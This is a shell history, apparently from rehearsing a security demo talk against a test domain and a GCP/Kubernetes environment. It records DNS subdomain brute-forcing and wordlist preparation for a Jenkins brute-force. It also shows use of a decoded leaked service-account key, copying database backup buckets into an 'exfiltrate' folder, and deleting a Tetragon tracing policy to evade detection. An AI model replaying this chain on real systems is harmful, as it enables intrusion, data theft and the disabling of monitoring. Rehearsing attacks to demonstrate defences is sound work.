sudo apt update
apt update
apt install fish
fish
exit
fish
exit
apt install xfce4
fish
./entrypoint.sh 
exit
fish
exit
ps -ef|grep -i xf
ps -ef|more
netstat -na|grep 5900
ps -ef|more
fish
exit
ps -ef|more
exit
fish
history
exit
exit
clear
exit
bash
apt update
sudo apt install -y novnc x11vnc
openssl genrsa -out mykey.key 2048
yes ""|openssl req -new -key mykey.key -out mycsr.csr
openssl x509 -req -days 1095 -in mycsr.csr -signkey mykey.key -out mycert.crt
ls -ltr
vim entrypoint.sh
exit
clear
ps -ef|grep -i vnc
cat entrypoint.sh 
/usr/share/novnc/utils/novnc_proxy --listen 443 --vnc localhost:5900 --key /mykey.key  --cert /mycert.crt --ssl-only > /dev/null 2>&1 &
ps -ef|grep -i vnc
exit
ps -ef|grep -i vnc
vim entrypoint.sh 
fish
exit
fish
exit
fish
exit
fish
exit
fish
exit
fish
exit
history
exit
mkdir -p /root/demotalk
cd /root/demotalk
git clone https://github.com/captain-noob/username-list-generator.git
gzip -d /usr/share/wordlists/rockyou.txt.gz /usr/share/wordlists/
mkdir -p /root/demotalk/dnsEnum
cd /root/demotalk/dnsEnum
wget -O /usr/share/wordlists/subdomains-top1million-5000.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt
more /usr/share/wordlists/
ls -al /usr/share/wordlists/
more /usr/share/wordlists/rockyou.txt 
echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo tee /usr/share/keyrings/cloud.google.gpg
apt-get update && apt-get install google-cloud-cli google-cloud-sdk-gke-gcloud-auth-plugin
exit
octant
exit
octant
cd /root/demotalk/
ls
mkdir jenkinsBrute
cd jenkinsBrute/
cd ..
ls
cd username-list-generator/
ls
rm output.txt 
rm user
rm user.txt 
nano user.txt
ls
python userlistcreator.py
more output.txt 
mv output.txt ../jenkinsBrute/userlist.txt
cd ..
cd jenkinsBrute/
sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
exit
sudo apt-get update && sudo apt-get install -y google-cloud-cli google-cloud-sdk-gke-gcloud-auth-plugin
exit
cd /root/demotalk/
ls
cd dnsEnum/
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
dnsrecon -t brt -d tj1.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
mfsconsole
msfconsole
msfconsole 
cd ..
cd cloudAccess/
cat encode.json | base64 --decode > gcpSa.json
ls ../
cat encoded.json | base64 --decode > gcpSa.json
more encoded.json 
more gcpSa.json 
gcloud auth activate-service-account --key-file=gcpSa.json 
echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
rm /etc/apt/sources.list.d/google-cloud-sdk.list 
echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
sudo curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -
echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
passwd root
chmod 755 /root/demotalk/*
cp -R /root/demotalk/ /tmp/
docker ps
nano tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
nano /etc/apt/sources.list.d/google-cloud-sdk.list
cd /root
ls
cd Downloads/
ls
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg
ls
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | tee /usr/share/keyrings/cloud.google.gpg
apt-get update
sudo apt-get install apt-transport-https ca-certificates gnupg curl sudo
apt-get install apt-transport-https ca-certificates gnupg
rm /etc/apt/sources.list.d/google-cloud-sdk.list
echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
rm /etc/apt/sources.list.d/google-cloud-sdk.list
echo "deb https://packages.cloud.google.com/apt cloud-sdk main" | tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add -
apt-get update
rm /etc/apt/sources.list.d/google-cloud-sdk.list
apt-get update
echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
nano /etc/apt/sources.list.d/google-cloud-sdk.list
echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
nano /etc/apt/sources.list.d/google-cloud-sdk.list
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -
more /usr/share/keyrings/cloud.google.gpg 
rm /usr/share/keyrings/cloud.google.gpg
rm /etc/apt/sources.list.d/google-cloud-sdk.list
echo "deb https://packages.cloud.google.com/apt cloud-sdk main" | tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add -
apt-get update && apt-get install -y google-cloud-cli google-cloud-sdk-gke-gcloud-auth-plugin
kubectl
apt install kubernetes-client
wget https://github.com/vmware-archive/octant/releases/download/v0.25.1/octant_0.25.1_Linux-64bit.deb
dpkg -i octant_0.25.1_Linux-64bit.deb
cd /root/demotalk/cloudAccess/
gcloud auth activate-service-account --key-file=gcpSa.json 
gcloud init --console-only
gcloud storage buckets list
gcloud container clusters list
gcloud storage buckets list | grep rs
gcloud storage buckets list | grep id
cd ..
mkdir exfiltrate
gcloud storage cp -r gs://conduit-database-backup-tj1 .
ls
rm -rf conduit-database-backup-tj1/
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-tj1
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-tj2
k9s
kubectl edit deployment/conduit-backend -n conduit-app
kubectl get TracingPolicy --all-namespaces
kubectl delete TracingPolicy haproxy
kubectl edit deployment/conduit-backend -n conduit-app
kubectl get TracingPolicy --all-namespaces
kubectl delete TracingPolicy haproxy
kubectl get TracingPolicy --all-namespaces
kubectl edit deployment/conduit-backend -n conduit-app
kubectx
kubectl config get-context
kubectl config
kubectl config get-contexts
kubectl config use-context gke_thorsten-jakoby-tj-projekt_europe-west3_conduit-k8s-tj1
kubectl edit deployment/conduit-backend -n conduit-app
exit
rm /root/.kube/config
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
cd /root/demotalk/cloudAccess
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
gcloud init --console-only
rm -r /root/.config/gcloud/
cd /root/demotalk/
ls
cd cloudAccess/
ls
rm encoded.json 
nano encoded.json
more encoded.json 
cat encoded.json | base64 --decode > gcpSa.json
rm gcpSa.json 
cat encoded.json | base64 --decode > gcpSa.json
octant
exit
cd /root/demotalk/cloudAccess/
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-tj2
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
kubectl delete TracingPolicy haproxy
kubectl edit deployment/conduit-backend -n conduit-app
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-prod
kubectl config
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-prod
kubectl edit deployment/conduit-backend -n conduit-app
rm -r /root/demotalk/cloudAccess /root/demotalk/jenkinsBrute/
ls /root/demotalk/
cd /root/demotalk/
cd dnsEnum/
ls
cd ..
cd exfiltrate/
l
ls
cd ..
rm -rf exfiltrate/
cd username-list-generator/
ls
more user.txt 
nano user.txt 
ls
nano user-original.txt
cd ..
ls
kubectl get nodes
rm /root/.kube/config
rm -r /root/.config/gcloud/
kubectl get nodes
exit
cd /root/demotalk/
mkdir cloudAccess
cd cloudAccess/
nano encrypted.json
cd /root/demotalk/cloudAccess/
ls
more encrypted.json
ls
NANO
EXIT
exit
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole
exit
sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
mkdir /root/demotalk/jenkinsBrute
sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
cd /root/demotalk/username-list-generator/
more user.txt 
more user-original.txt 
python3 ./userlistcreator.py 
mv output.txt ../jenkinsBrute/userlist.txt
exit
cd /root/demotalk/cloudAccess/
ls
rm encrypted.json.save 
mv encrypted.json encoded.json
cat encoded.json | base64 --decode > gcpSa.json
more gcpSa.json 
gcloud activate-service-account --key-file=gcpSa.json 
gcloud auth activate-service-account --key-file=gcpSa.json 
gcloud init --console-only
gcloud containers cluster list
gcloud containers clusters list
gcloud container clusters list
gcloud storage buckets list
gcloud storage buckets list | grep id
cd /root/demotalk/cloudAccess/
gcloud storage cp -r gs://conduit-database-backup-test .
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
kubectl edit deployment/conduit-backend -n conduit-app
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-prod
kubectl edit deployment/conduit-backend -n conduit-app
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
kubectl edit deployment/conduit-backend -n conduit-app
kubectl get pods -n conduit-app
rm -r /root/demotalk/cloudAccess /root/demotalk/jenkinsBrute
rm /root/.kube/config
rm -r /root/.config/gcloud/
ls
ls /root/demotalk/
exit
kubectl edit deployment/conduit-backend -n conduit-app
kubectl get pods -n conduit-app
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
kubectl get pods -n conduit-app
kubectl edit deployment/conduit-backend -n conduit-app
kubectl get pods -n conduit-app
exit
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole
sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
mkdir -p /root/demotalk/jenkinsBrute
sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
cd /root/demotalk/username-list-generator/
more user-original.txt 
python3 ./userlistcreator.py 
more user.txt 
more output.txt 
mv output.txt /root/demotalk/jenkinsBrute/users.txt
cd /root/demotalk/cloudAccess/
cat encoded.json | base64 --decode > gcpSa.json
more gcpSa.json 
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
gcloud storage buckets ls
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
kubectl edit deployment/conduit-backend -n conduit-app
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-prod
kubectl edit deployment/conduit-backend -n conduit-app
dnsrecon nevervictimconsult.xyz
dnsenum nevervictimconsult.xyz
dnsrecon -d nevervictimconsult.xyz -t brt -D /usr/share/wordlists/subdomains-top1million-5000.txt --threads25
dnsrecon -d nevervictimconsult.xyz -t brt -D /usr/share/wordlists/subdomains-top1million-5000.txt --threads 25
vim
exit
cd /root/demotalk/
mkdir cloudaccess
cd cloudaccess/
nano encoded.json
cat encoded.json | base64 --decode gcpSa.json
cat encoded.json | base64 --decode > gcpSa.json
more gcpSa.json 
octant
exit
ls
cd /root/
ls
cd demotalk/
ls
cd cloudAccess/
ls
rm encoded.json 
rm gcpSa.json 
kubectl get nodes
rm -r /root/demotalk/cloudAccess /root/demotalk/jenkinsBrute
rm /root/.kube/config
rm -r /root/.config/gcloud/
kubectl get nodes
cd ..
cd username-list-generator/
ls
more user.txt 
cd ..
dnsenum nevervictimconsult.xyz
dnsreco -t brt -d nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
dnsrecon -t brt -d nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole 
cd cloudaccess/
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
kubectl get nodes
gcloud storage buckets list
gcloud storage buckets list | grep id
gcloud storage cp -r gs://conduit-backup-test/ . 
gcloud storage cp -r gs://conduit-database-backup-test/ . 
rm -r /root/demotalk/cloudAccess /root/demotalk/jenkinsBrute
rm -r /root/demotalk/cloudaccess /root/demotalk/jenkinsBrute
cd /root/demotalk/
ls
rm nevervictimconsult.xyz_ips.txt 
ls username-list-generator/
rm /root/.kube/config
rm -r /root/.config/gcloud/
gcloud storage buckets list | grep id
exit
cd /root/demotalk/username-list-generator/
more user.txt 
python3 userlistcreator.py 
mv output.txt /root/demotalk/jenkinsBrute/users.txt
cd ..
exit
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole 
exit
cd /root/demotalk
mkdir jenkinsBrute
cd jenkinsBrute/
sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
cd ..ls
cd ..
ls
cd username-list-generator/
python3 userlistcreator.py 
mv output.txt /root/demotalk/jenkinsBrute/users.txt
nano user.txt 
python3 userlistcreator.py 
mv output.txt /root/demotalk/jenkinsBrute/users.txt
cd ..
cd jenkinsBrute/
ls
nano passwordlist.txt 
nano users.txt 
cd ..
cd username-list-generator/
ls
nano user
nano user.txt 
cd ..
exit
cd /root/demotalk/
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-prod
kubectl edit deployment conduit-backend/conduit-backend -n conduit-app
kubectl edit deployment/conduit-backend -n conduit-app
k9s
kubectl get pods -n conduit-app
kubectl edit deployment/conduit-backend -n conduit-app
kubectl get pods -n conduit-app
rm -r /root/.config/gcloud/
rm ~/.kube/config 
ls
rm nevervictimconsult.xyz_ips.txt 
cd cloudAccess/
ls
rm gcpSa.json 
ls
more encoded.json 
exit
cd /root/demotalk/
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole 
cd cloudAccess/
cat encoded.json | base64 --decode > gcpSa.json
more encoded.json 
rm encoded.json 
cat encoded.json | base64 --decode > gcpSa.json
more gcpSa.json 
ls
more gcpSa.json 
rm gcpSa.json 
ls
cat encoded.json | base64 --decode
cat encoded.json | base64 --decode > gcpSa.json
more gcpSa.json 
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
gcloud storage buckets list | grep id
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
exit
mkdir -p /root/demotalk/cloudAccess
cd /root/demotalk/cloudAccess/
nano encoded.json
cat encoded.json | base64 -D > gcpSa.json 
cat encoded.json | base64 --decode > gcpSa.json 
cat encoded.json | base64 --decode > gcpSa.json
more encoded.json 
nano encoded.json
rm encoded.json 
nano encoded.json
rm encoded.json 
nano encoded.json
octant
exit
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole
cd /root/demotalk/cloudAccess/
nano encoded.json 
ls
cat encoded.json | base64 --decode > gcpSa.json
more gcpSa.json 
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud login --console-only
gcloud init --console-only
gcloud storage buckets list | grep id
gcloud storage cp -r gs://conduit-database-backup-test/ . 
glcoud container clusters list
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
kubectl edit deployment/conduit-backend -n conduit-app
ls
rm gcpSa.json 
rm -rf conduit-database-backup-test/
ls

rm -r /root/.config/gcloud/
ls
cd ..
ls
cd cloudAccess/
ls
cd ..
exit
ls
exit
msfconsole
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole 
cd /root/demotalk/cloudAccess/
more encoded.json 
cat encoded.json | base64 --decode > gcpSa.json
more gcpSa.json 
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
gcloud storage buckets list
gcloud storage buckets list | grep id
gcloud storage cp -r gs://conduit-database-backup-test/ . 
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
kubectl edit deployment/conduit-backend -n conduit-app
cd /root
ls
cd demotalk/
ls
cd cloudAccess/
ls
rm -rf conduit-database-backup-test/
cd ..
ls
cd dnsEnum/
ls
cd ..
cd jenkinsBrute/
ls
cd ..
cd username-list-generator/
ls
cd ..
ls
more ~/.bash_history 
tail -n50 ~/.bash_history 
exit
cd /root/demotalk/cloudAccess/
ls
rm gcpSa.json 
cat encoded.json | base64 --decode > gcpSa.json
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud login --console-only
gcloud init --console-only
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
ls
rm gcpSa.json 
cd ..
ls
rm nevervictimconsult.xyz_ips.txt 
rm /root/.kube/config
rm -r /root/.config/gcloud/
exit
ls
cd /root/demotalk/jenkinsBrute/
ls
more users.txt 
cd ..
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole 
exit
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole 
nano /root/demotalk/cloudAccess/encoded.json
rm /root/demotalk/cloudAccess/encoded.json
nano /root/demotalk/cloudAccess/encoded.json
cd /root/demotalk/cloudAccess/
ls
cat encoded.json | base64 --decode > gcpSa.json
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
kubectl edit deployment/conduit-backend -n conduit-app
rm /root/.kube/config
rm -r /root/.config/gcloud/
ls
rm gcpSa.json 
ls
cd ..
ls
exit
cd /root/demotalk/
cd /root/demotalk/
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole 
cd cloudAccess/
nano encoded.json 
cat encoded.json | base64 --decode > gcpSa.json
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
gcloud storage bucktes list
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
kubectl edit deployment/conduit-backend -n conduit-app
cd /tmp
curl -L https://github.com/cilium/tetragon/releases/latest/download/tetra-linux-amd64.tar.gz | tar -xz
sudo mv tetra /usr/local/bin
tetra
exit
kubectl get nodes
v1.27.3-gke.100
rm /root/.kube/config
rm -r /root/.config/gcloud/
exit
cd /root/demotalk/
ls
cd cloudAccess/
ls
rm gcpSa.json 
cd ..
ls
cd cloudAccess/
ls
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole
nano encoded.json 
cat encoded.json | base64 --decode > gcpSa.json
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
gcloud storage buckets list | grep id
gcloud storage cp -r gs://conduit-database-backup-test/ . 
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
kubectl edit deployment/conduit-backend -n conduit-app
exit
ls /root/demotalk/
cd root/demotalk/cloudAccess/
ls
rm -rf conduit-database-backup-test/
rm gcpSa.json 
more encoded.json 
rm encoded.json 
cd ..
ls
kubectl get nodes
rm /root/.kube/config 
kubectl get nodes
more /root/demotalk/jenkinsBrute/users.txt 
exit
rm -r /root/.config/gcloud/
rm /root/.kube/config
exit
cd /root/demotalk/
cd cloudAccess/
l
ls
cd ..
cd /root/demotalk/
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole 
cd cloudAccess/
nano encoded.json
cat encoded.json | base64 --decode > gcpSa.json
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
gcloud container clusters get-credentials --region=europe-west3-c conduit-k8s-test
gcloud storage buckets list | grep id
gcloud storage cp -r gs://conduit-database-backup-test/ . 
kubectl edit deployment/conduit-backend -n conduit-app
cd /root/demotalk/
ls
rm nevervictimconsult.xyz_ips.txt 
cd cloudAccess/
ls
rm encoded.json 
rm gcpSa.json 
rm -rf conduit-database-backup-test/
ls
kubectl get nodes
rm /root/.kube/config
rm -r /root/.config/gcloud/
ls
cd ..
ls
cd dnsEnum/
ls
cd ..
cd jenkinsBrute/
ls
more users.txt 
nano users.txt 
cd ..
metasploit
msfconsole 
exit
cd /root/demotalk/
ls
cd jenkinsBrute/
more users.txt 
more passwordlist.txt 
cd ..
ls
de dnsEnum/
cd dnsEnum/
msfconsole 
dnsenum nevervictimconsult.xyz
dnsrecon -t brt -d nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
dnsrecon -t brt -d test.nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt 
msfconsole 
cd ..
cd cloudAccess/
nano encoded.json
cat encoded.json | base64 --decode > gcpSa.json
gcloud init --console-only
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
gcloud container clusters list
gcloud container clusters get-credentials --region=europe-west3-c conduit-k8s-test
kubectl get nodes
kubectl edit deployment/conduit-backend -n conduit-app
rm encoded.json 
rm gcpSa.json 
rm /root/.kube/config
rm -r /root/.config/gcloud/
exit
cd /root/demotalk/
exit
